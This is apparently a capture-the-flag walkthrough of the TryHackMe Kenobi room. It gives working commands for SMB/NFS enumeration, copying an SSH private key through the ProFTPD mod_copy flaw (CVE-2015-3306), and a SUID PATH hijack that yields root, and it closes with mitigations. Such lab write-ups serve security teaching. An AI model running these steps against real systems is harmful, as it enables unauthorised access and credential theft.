---
title: "TryHackMe: Kenobi — Samba Enumeration, ProFTPD mod_copy RCE & SUID Path Hijacking"
author: parthpandey
categories: [TryHackMe, Walkthroughs]
tags: [linux, proftpd, mod-copy, samba, nfs, suid, path-hijacking, privesc, cve-2015-3306]
render_with_liquid: false
date: 2026-10-04 15:30:00 +0530
---

**Kenobi** is an iconic Linux security challenge that demonstrates a realistic multi-stage exploitation chain. It begins with network reconnaissance against **Samba** and **NFS** network shares, exploits an unauthenticated file copying flaw in **ProFTPD 1.3.5 (CVE-2015-3306)** to exfiltrate private SSH keys into a mounted NFS share, and completes with local privilege escalation by weaponizing an insecure `$PATH` environment variable lookup inside a custom SUID binary.

---

## Room Metadata

| Attribute | Specification |
|:---|:---|
| **Platform** | TryHackMe |
| **Room URL** | [tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi) |
| **Target OS** | Linux (Ubuntu) |
| **Difficulty** | Easy / Intermediate |
| **Key Vulnerabilities** | ProFTPD `mod_copy` Arbitrary File Copy (CVE-2015-3306), Insecure NFS Share Export, SUID Binary Binary Path Hijacking |
| **Key Tools** | `nmap`, `smbclient`, `smbget`, `nfs-common`, `showmount`, `nc` |

---

## Attack Chain Overview

```
[Phase 1: Reconnaissance]
   │── Nmap Full Scan (Ports 21, 22, 80, 111, 139, 445, 2049)
   │── SMB Enumeration (smbclient finds anonymous share '/anonymous')
   └── NFS Share Discovery (showmount -e identifies export '/var')
         │
[Phase 2: Initial Exploitation via ProFTPD]
   │── Version Identification (ProFTPD 1.3.5)
   │── Vulnerability: CVE-2015-3306 (mod_copy module CPFR / CPTO commands)
   │── Exfiltrate Kenobi's id_rsa private key:
   │     SITE CPFR /home/kenobi/.ssh/id_rsa
   │     SITE CPTO /var/tmp/id_rsa
   └── Mount NFS share locally: mount target:/var /mnt/kenobi_nfs
         │
[Phase 3: Shell Access]
   │── Copy id_rsa, set chmod 600
   └── SSH Login: ssh -i id_rsa kenobi@target ──> User Flag Captured!
         │
[Phase 4: Privilege Escalation]
   │── Locate SUID Binaries: find / -perm -u=s -type f 2>/dev/null
   │── Identified Custom SUID Binary: /usr/bin/menu
   │── Reverse Engineering: strings /usr/bin/menu reveals raw call: 'curl -I localhost'
   │── $PATH Hijacking:
   │     echo '/bin/sh' > /tmp/curl
   │     chmod 777 /tmp/curl
   │     export PATH=/tmp:$PATH
   └── Execute /usr/bin/menu -> Select Option 1 ──> Root Shell (#)
```

---

## Phase 1: Port Scanning & Enumeration

We kick off with an extensive Nmap service and vulnerability scan:

```console
$ nmap -sC -sV -p- -T4 --min-rate 1000 -oN kenobi_scan.txt 10.10.180.45
```

### Scan Results Breakdown

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100005  1,2,3      41249/tcp   mountd
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
2049/tcp open  nfs_acl     2-3 (RPC #100227)
```

### Key Observations
1. **Port 21**: Running **ProFTPD 1.3.5** (historically vulnerable to unauthenticated `mod_copy`).
2. **Ports 139 & 445**: Running Samba file sharing.
3. **Ports 111 & 2049**: RPC and Network File System (NFS) active.

---

## Phase 2: SMB & NFS Enumeration

### 1. SMB Share Discovery
We enumerate accessible shares using Nmap scripts and `smbclient`:

```console
$ smbclient -L //10.10.180.45/ -N
```

```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```

The share `anonymous` allows unauthenticated access:

```console
$ smbclient //10.10.180.45/anonymous -N
smb: \> ls
  .                                   D        0  Wed Sep  4 08:49:09 2019
  ..                                  D        0  Wed Sep  4 08:56:07 2019
  log.txt                             N    12237  Wed Sep  4 08:49:09 2019

smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (42.5 KByte/s)
smb: \> exit
```

Inspecting `log.txt` reveals critical internal configuration details:
- An SSH private key was generated for the user `kenobi` (`/home/kenobi/.ssh/id_rsa`).
- ProFTPD configuration path: `/etc/proftpd/proftpd.conf`.

### 2. NFS Mount Discovery
Next, we interrogate the NFS daemon on port 111 using `showmount`:

```console
$ showmount -e 10.10.180.45
Export list for 10.10.180.45:
/var *
```

The `/var` directory is exported to **anyone (`*`)**!

---

## Phase 3: Exploiting ProFTPD (CVE-2015-3306)

ProFTPD 1.3.5 includes the `mod_copy` module enabled by default. This module exposes the `CPFR` (copy from) and `CPTO` (copy to) commands to **unauthenticated** users via raw FTP connection.

Because `/var` is accessible via our NFS mount, if we can copy Kenobi's private SSH key into `/var/tmp/`, we can read it directly from our locally mounted NFS directory!

### Step 1: Issue `SITE CPFR` and `SITE CPTO` via Netcat

```console
$ nc 10.10.180.45 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.180.45]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
QUIT
221 Goodbye.
```

### Step 2: Mount the NFS Share Locally & Extract Key

```console
$ sudo mkdir -p /mnt/kenobi_share
$ sudo mount 10.10.180.45:/var /mnt/kenobi_share
$ ls -la /mnt/kenobi_share/tmp/id_rsa
-rw-r--r-- 1 root root 1675 Oct  4 15:42 /mnt/kenobi_share/tmp/id_rsa

$ cp /mnt/kenobi_share/tmp/id_rsa ./id_rsa_kenobi
$ sudo umount /mnt/kenobi_share
$ chmod 600 id_rsa_kenobi
```

### Step 3: Gain Initial Shell via SSH

```console
$ ssh -i id_rsa_kenobi kenobi@10.10.180.45
kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),...
kenobi@kenobi:~$ cat /home/kenobi/user.txt
d0b0f4...[REDACTED USER FLAG]
```

---

## Phase 4: Privilege Escalation via SUID Path Hijacking

### 1. Enumerate SUID Binaries

```console
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/bin/ping
/bin/fusermount
```

The binary `/usr/bin/menu` is atypical and stands out immediately.

### 2. Inspect the SUID Binary

Running the binary presents three menu options:
```console
kenobi@kenobi:~$ /usr/bin/menu

*************************************
1. status check
2. kernel version
3. ifconfig
**Enter your choice :**
```

Let's inspect the embedded strings inside the binary:

```console
kenobi@kenobi:~$ strings /usr/bin/menu | grep -E "curl|uname|ifconfig"
curl -I localhost
uname -r
ifconfig
```

Notice that option 1 executes `curl -I localhost` **without specifying an absolute path** (like `/usr/bin/curl`). It relies entirely on the user's current `$PATH` environment variable!

### 3. Exploiting `$PATH` Insecurity

Because `/usr/bin/menu` runs with SUID `root` permissions, if we prepend our own directory (like `/tmp`) to `$PATH` and create a malicious executable named `curl`, `/usr/bin/menu` will execute our script with full `root` privileges.

```console
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo "/bin/sh" > curl
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:...
```

Now, invoke `/usr/bin/menu` and select Option 1:

```console
kenobi@kenobi:/tmp$ /usr/bin/menu

*************************************
1. status check
2. kernel version
3. ifconfig
**Enter your choice :** 1
# id
uid=0(root) gid=0(root) groups=0(root),1000(kenobi)
# whoami
root
# cat /root/root.txt
1773c5...[REDACTED ROOT FLAG]
```

---

## Defensive Hardening & Mitigation

| Vulnerability Vector | Technical Remediation |
|:---|:---|
| **ProFTPD `mod_copy`** | Upgrade ProFTPD to $\ge$ 1.3.6. In `/etc/proftpd/proftpd.conf`, explicitly disable `mod_copy` or enforce `<Limit SITE_MKDIR SITE_RMDIR SITE_CPFR SITE_CPTO>` to authenticated administrative users only. |
| **NFS Share Export** | In `/etc/exports`, never export `/var` or filesystems containing sensitive runtime state to wildcard (`*`). Require explicit client IP CIDRs and append `root_squash` and `nosuid`. |
| **SUID Path Manipulation** | In custom C binaries, **always supply absolute binary paths** (e.g. `/usr/bin/curl` instead of `curl`). Clear or sanitize the runtime environment via `clearenv()` before issuing `system()` or `execve()` calls. |

